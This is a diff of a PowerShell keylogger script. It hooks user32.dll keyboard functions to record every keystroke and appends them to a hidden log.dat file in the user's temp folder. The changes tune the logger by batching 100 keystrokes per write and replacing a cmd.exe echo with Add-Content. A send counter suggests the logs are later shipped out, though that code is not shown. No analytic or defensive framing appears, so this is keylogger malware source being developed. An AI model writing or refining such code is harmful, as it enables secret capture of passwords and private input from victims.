@@ -1,4 +1,4 @@
-function run-key([Int]$send)
+function run-key([Int]$send, [Int]$counter)
 {
   $signatures = @'
         [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -11,7 +11,7 @@ function run-key([Int]$send)
         public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-  [Int]$counter = 0
+  $File = "$env:TEMP\log.dat"
   [Int]$end = 0
   [String]$lista = ""
   try
@@ -35,10 +35,10 @@ function run-key([Int]$send)
             # add key to logger file
             $lista += $mychar
             $counter++
-            if ($counter -ge 20)
+            if ($counter -ge 100)
             {
               $counter = 0
-              cmd.exe /c "echo $lista>>%temp%\log.dat"
+              Add-Content -Path $File -Value $lista -NoNewline
               $lista = ""
               $send++
               if ($send -ge 3)
@@ -71,4 +71,4 @@ function run-key([Int]$send)
     }
   }
 }
-run-key 0
+run-key 0 0
